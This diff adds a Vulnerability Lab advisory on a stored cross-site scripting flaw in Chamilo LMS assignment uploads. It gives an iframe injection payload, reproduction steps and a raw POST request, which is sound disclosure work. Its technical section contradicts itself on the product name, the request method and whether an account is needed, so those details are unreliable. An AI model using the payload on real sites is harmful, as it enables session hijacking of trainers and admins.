@@ -1,0 +1,193 @@
+Document Title:
+===============
+Chamilo LMS - Persistent Cross Site Scripting Vulnerability
+
+
+References (Source):
+====================
+http://www.vulnerability-lab.com/get_content.php?id=
+
+Video: https://www.youtube.com/watch?v=gNZsQjmtiGI
+
+
+Release Date:
+=============
+2016-02-17
+
+
+Vulnerability Laboratory ID (VL-ID):
+====================================
+1727
+
+
+Common Vulnerability Scoring System:
+====================================
+3.3
+
+
+Product & Service Introduction:
+===============================
+Chamilo is an open-source (under GNU/GPL licensing) e-learning and content management system, aimed at improving access to education and knowledge globally. 
+It is backed up by the Chamilo Association, which has goals including the promotion of the software, the maintenance of a clear communication channel and 
+the building of a network of services providers and software contributors.
+
+The Chamilo project aims at ensuring the availability and quality of education at a reduced cost, through the distribution of its software free of charge,
+the improvement of its interface for 3rd world countries devices portability and the provision of a free access public e-learning campus.
+
+(Copy of the Homepage: https://chamilo.org/chamilo-lms/ )
+
+
+Abstract Advisory Information:
+==============================
+A persistent cross site scripting vulnerability has been discoverd in the official web-application Product Chamilo LMS.
+
+
+Vulnerability Disclosure Timeline:
+==================================
+2016-02-17: Public Disclosure (Vulnerability Laboratory)
+
+
+Discovery Status:
+=================
+Published
+
+
+Exploitation Technique:
+=======================
+Remote
+
+
+Severity Level:
+===============
+Medium
+
+
+Technical Details & Description:
+================================
+A GET cross site scripting web vulnerability has been discovered in the official Netlife Photosuite Pro Content Management System.
+A vulnerability allows remote attackers to inject malicious script codes on the client-side of the affected web-application.
+
+The vulnerability is located in the `title` input field of the `work/upload.php` file. Remote attackers are able to inject own 
+malicious script codes to the client-side of the affected web-application. The request method to inject is POST and the attack 
+vector is client-side. The attacker injects the payload in the vulnerable input field to execute the code in view.php.
+
+The security risk of the client-side web vulnerability is estimated as medium with a cvss (common vulnerability scoring system) count of 3.3. 
+Exploitation of the non-persistent cross site scripting web vulnerability requires low privileged web-application user account and low user interaction. 
+Successful exploitation results in session hijacking, persistent phishings attacks, persistent external redirect and malware loads or persistent 
+manipulation of affected or connected module context.
+
+
+Request Method(s):
+					[+] POST
+
+Vulnerable Module(s):
+					[+] work/
+
+Vulnerable File(s):
+					[+] upload.php
+					[+] view.php
+
+Vulnerable Parameter(s):
+					[+] title
+
+
+Proof of Concept (PoC):
+=======================
+The vulnerability can be exploited by remote attackers without web-application user account and low user interaction.
+For security demonstration or to reproduce the vulnerability follow the provided information and steps below to continue.
+
+Manual steps to reproduce the vulnerability ...
+1. Users goes to [ Course name > Assignments > ]
+2. users will follow the [Assignments] made by Course Trainer or admin of Chamilo platform . 
+3. Users will click on button titled as [ upload My Assignments] .
+4. an upload Document is Shown and A parameter [ Title ] is vulnerable to POC Payload ["><iframe src=http://vulnerability-lab.com >]
+5. when trainer or admin view Assignments of user, code is executed successfully 
+
+--- PoC Session Logs [POST] ---
+POST /site/main/work/upload.php?cidReq=[Course name]&id_session=0&gidReq=0&gradebook=0&origin=&id=1 HTTP/1.1
+Host: chamilo.org
+User-Agent: Mozilla/5.0 (X11; Linux i686; rv:22.0) Gecko/20100101 Firefox/22.0 Iceweasel/22.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+
+Cookie: defaultMyCourseView15=0; __cfduid=dcb5fdb8a71117667369addf2c390449a331452648620; ch_sid=9daew954ef087c82cb0cab6037949478e
+Connection: keep-alive
+Content-Type: multipart/form-data; boundary=---------------------------206976886318079499742071692496
+Content-Length: 1482
+-----------------------------206976886318079499742071692496
+Content-Disposition: form-data; name="title"
+[<Persistent Code Injection>] 
+-----------------------------206976886318079499742071692496
+Content-Disposition: form-data; name="file"; filename=""
+Content-Type: application/octet-stream
+-----------------------------206976886318079499742071692496
+Content-Disposition: form-data; name="description"
+<p>really thats out of brain</p>
+-----------------------------206976886318079499742071692496
+Content-Disposition: form-data; name="submitWork"
+-----------------------------206976886318079499742071692496
+Content-Disposition: form-data; name="_qf__form"
+-----------------------------206976886318079499742071692496
+Content-Disposition: form-data; name="contains_file"
+0
+-----------------------------206976886318079499742071692496
+Content-Disposition: form-data; name="active"
+1
+-----------------------------206976886318079499742071692496
+Content-Disposition: form-data; name="accepted"
+1
+-----------------------------206976886318079499742071692496
+Content-Disposition: form-data; name="MAX_FILE_SIZE"
+134217728
+-----------------------------206976886318079499742071692496
+Content-Disposition: form-data; name="id"
+1
+-----------------------------206976886318079499742071692496
+Content-Disposition: form-data; name="sec_token"
+435ad99d48d0fe2e6bed594707dffc1d
+-----------------------------206976886318079499742071692496--
+
+
+Security Risk:
+==============
+The security risk of the persistent cross site script vulnerability in the web-application is estimated as medium. (CVSS 3.3)
+
+
+Credits & Authors:
+==================
+Lawrence Amer - ( http://www.vulnerability-lab.com/show.php?user=Lawrence%20Amer )
+
+
+Disclaimer & Information:
+=========================
+The information provided in this advisory is provided as it is without any warranty. Vulnerability Lab disclaims all warranties, either expressed 
+or implied, including the warranties of merchantability and capability for a particular purpose. Vulnerability-Lab or its suppliers are not liable 
+in any case of damage, including direct, indirect, incidental, consequential loss of business profits or special damages, even if Vulnerability-Lab 
+or its suppliers have been advised of the possibility of such damages. Some states do not allow the exclusion or limitation of liability for 
+consequential or incidental damages so the foregoing limitation may not apply. We do not approve or encourage anybody to break any vendor licenses, 
+policies, deface websites, hack into databases or trade with fraud/stolen material.
+
+Domains:    www.vulnerability-lab.com   	- www.vuln-lab.com			       		- www.evolution-sec.com
+Contact:    admin@vulnerability-lab.com 	- research@vulnerability-lab.com 	       		- admin@evolution-sec.com
+Section:    magazine.vulnerability-db.com	- vulnerability-lab.com/contact.php		       	- evolution-sec.com/contact
+Social:	    twitter.com/#!/vuln_lab 		- facebook.com/VulnerabilityLab 	       		- youtube.com/user/vulnerability0lab
+Feeds:	    vulnerability-lab.com/rss/rss.php	- vulnerability-lab.com/rss/rss_upcoming.php   		- vulnerability-lab.com/rss/rss_news.php
+Programs:   vulnerability-lab.com/submit.php  	- vulnerability-lab.com/list-of-bug-bounty-programs.php	- vulnerability-lab.com/register/
+
+Any modified copy or reproduction, including partially usages, of this file requires authorization from Vulnerability Laboratory. Permission to 
+electronically redistribute this alert in its unmodified form is granted. All other rights, including the use of other media, are reserved by 
+Vulnerability-Lab Research Team or its suppliers. All pictures, texts, advisories, source code, videos and other information on this website 
+is trademark of vulnerability-lab team & the specific authors or managers. To record, list (feed), modify, use or edit our material contact 
+(admin@vulnerability-lab.com or research@vulnerability-lab.com) to get a permission.
+
+				Copyright © 2016 | Vulnerability Laboratory - [Evolution Security GmbH]™
+
+
+
+-- 
+VULNERABILITY LABORATORY - RESEARCH TEAM
+SERVICE: www.vulnerability-lab.com
+CONTACT: research@vulnerability-lab.com
+
+
